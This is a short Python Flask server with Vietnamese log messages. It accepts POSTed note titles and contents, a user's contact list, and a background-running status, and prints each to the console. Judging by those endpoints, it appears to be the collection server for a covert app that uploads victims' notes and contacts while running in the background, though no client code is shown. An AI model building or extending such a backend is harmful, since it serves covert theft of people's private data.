from flask import Flask, request

app = Flask(__name__)
running = False

@app.route("/log/note", methods=["POST"])
def log_note():
    title = request.form.get("title", "")
    content = request.form.get("content", "")
    print("📝 Ghi chú mới:")
    print(f"Tiêu đề: {title}")
    print(f"Nội dung: {content}")
    print("=" * 50)
    return "Note received", 200

@app.route("/log/contacts", methods=["POST"])
def log_contacts():
    contacts = request.form.get("contacts", "")
    print("📇 Danh bạ người dùng:")
    print(contacts)
    print("=" * 50)
    return "Contacts received", 200

@app.route("/log/status", methods=["POST"])
def log_status():
    global running
    status = request.form.get("status", "")
    running = status
    print(f"📡 Trạng thái chạy ngầm: {running}")
    return "Status received", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
